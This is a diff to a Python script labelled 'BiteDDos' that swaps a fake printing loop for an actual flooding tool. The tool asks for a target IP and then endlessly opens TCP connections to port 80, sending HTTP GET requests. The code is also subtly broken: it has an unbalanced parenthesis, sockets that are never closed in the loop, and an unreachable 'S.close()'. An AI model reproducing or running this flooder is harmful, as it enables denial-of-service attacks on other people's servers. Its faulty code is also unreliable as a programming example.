@@ -60,16 +60,19 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-from colorama import Fore, Back, Style, init
-import pyfiglet
 
-Tata = "BiteDDos"
-ASCII_art_1 = pyfiglet.figlet_format(Tata)
-print(ASCII_art_1)
-init()
-print("\033[31m ━━━\033[33m Ваша Цель Ddoss")
-x = str(input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
-z =1
-while z <= 15000000000 :
-    print(z ," ping :", x)
-    z+=1
+print("\033[31m ━━━\033[33m Ваша Цель Ddoss IP ")
+u = input("\033[31m ┗━━━━━━\033[32m>\033[0m "))
+
+from socket import *
+#make the by sadra
+
+p=0
+
+while True:
+     s = socket(AF_INET , SOCK_STREAM)
+     s.connect((u,80))
+     payamersali = s.send("GET / HTTP/1.1\r\nHost:facbook.com\r\n\r\n".encode(encoding='utf-8'))
+     p=p+1
+     print("sendpocket",p)
+S.close()
